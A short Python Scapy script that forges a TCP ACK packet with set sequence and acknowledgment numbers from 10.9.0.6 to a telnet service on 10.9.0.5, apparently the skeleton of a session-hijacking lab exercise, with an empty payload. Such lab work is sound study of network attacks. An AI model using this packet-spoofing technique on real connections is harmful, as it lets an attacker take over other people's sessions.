#!/usr/bin/env python3
from scapy.all import *
eth = Ether(src="02:42:0a:09:00:06")
ip  = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=40276, dport=23, flags="A", seq=196255085, ack=137309990)
data = ""
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)